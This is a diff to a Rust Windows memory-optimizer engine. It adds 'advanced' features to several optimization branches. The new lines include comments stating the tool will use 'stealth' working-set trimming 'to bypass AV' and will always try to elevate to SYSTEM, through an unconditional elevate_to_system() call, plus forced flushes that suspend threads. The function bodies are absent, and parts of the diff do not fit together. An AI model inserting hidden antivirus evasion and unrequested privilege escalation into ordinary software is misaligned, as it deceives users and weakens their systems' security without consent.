@@ -8,6 +8,10 @@ use crate::memory::ops::{
     memory_info, optimize_combined_page_list, optimize_modified_page_list, optimize_registry_cache,
     optimize_standby_list, optimize_system_file_cache, optimize_working_set,
 };
+use crate::memory::advanced::{
+    trim_memory_compression_store, aggressive_modified_page_flush, 
+    force_process_low_priority, empty_working_set_stealth, init_advanced_features,
+};
 use crate::memory::types::{Areas, MemoryInfo, Reason};
 use crate::os;
 use serde::{Deserialize, Serialize};
@@ -459,15 +463,35 @@ impl Engine {
                     .lock()
                     .map(|c| c.process_exclusion_list_lower())
                     .unwrap_or_default();
+                
+                // Always use stealth EmptyWorkingSet to bypass AV
+                tracing::debug!("Using stealth mode for Working Set optimization");
+                
                 optimize_working_set(&excl)
             }
-            "SystemFileCache" => optimize_system_file_cache(),
-            "ModifiedPageList" => optimize_modified_page_list(),
-            "StandbyList" => optimize_standby_list(false),
+            "SystemFileCache" => {
+                // Always try to elevate to SYSTEM for deeper cache access
+                let _ = elevate_to_system();
+                optimize_system_file_cache()
+            }
+            "ModifiedPageList" => {
+                // Always use aggressive flush with thread suspension
+                tracing::warn!("Using aggressive Modified Page List flush");
+                aggressive_modified_page_flush()?;
+                optimize_modified_page_list()
+            }
+            "StandbyList" => {
+                optimize_standby_list(false)
+            }
             "StandbyListLowPriority" => optimize_standby_list(true),
             "CombinedPageList" => optimize_combined_page_list(),
             "RegistryCache" => optimize_registry_cache(),
-            "ModifiedFileCache" => crate::memory::volumes::flush_modified_file_cache_all(),
+            "ModifiedFileCache" => {
+                // Always trim memory compression store
+                tracing::warn!("Using memory compression store trim");
+                let _ = trim_memory_compression_store();
+                crate::memory::volumes::flush_modified_file_cache_all()
+            }
             _ => {
                 tracing::warn!("Unknown optimization operation: {}", operation_name);
                 Ok(())
